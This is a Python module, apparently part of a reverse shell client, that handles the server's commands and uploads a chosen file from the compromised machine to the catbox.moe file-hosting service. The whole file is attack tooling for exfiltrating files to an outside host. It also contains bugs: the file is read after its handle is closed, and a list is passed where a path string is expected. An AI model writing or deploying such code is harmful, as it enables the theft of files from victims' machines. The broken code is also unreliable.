"""
This module handles all the file related task for the reverse shell
"""

# 1st party imports
import os
import requests
from typing import List

# local imports
from commands import ShellCommands


class FileManager:
    """
    This class handles all the file related task for the reverse shell
    """

    def handle_command(self, command: List[str]) -> str:
        """
        Handle the command received from the server.

        Args:
            command (List[str]): The command to handle.

        Returns:
            str: The output of the command.
        """

        if command[0] == ShellCommands.UPLOAD_FILE.value:
            return self.upload_file(command[1:])

        else:
            return f"Invalid command for file manager. Provided command: `{command}`"

    def upload_file(self, file_path: str) -> str:
        """
        Upload the file to the server.

        Args:
            file_path (str): The path of the file to upload.

        Returns:
            str: The output of the command.
        """

        # check if the file exists
        if not os.path.exists(file_path):
            return f"File does not exist. File path: `{file_path}`"

        # create the url and data
        url = "https://catbox.moe/user/api.php"
        data = {"reqtype": "fileupload"}

        # create the file payload
        with open(file_path, "rb") as file:
            file = {"fileToUpload": file}

        try:

            # upload the file
            response = requests.post(url, files=file, data=data)

            # check the status
            response.raise_for_status()

            # return the response
            return response.text
        except Exception as e:
            return f"Failed to send file. File path: `{file_path}`. Error: {str(e)}"
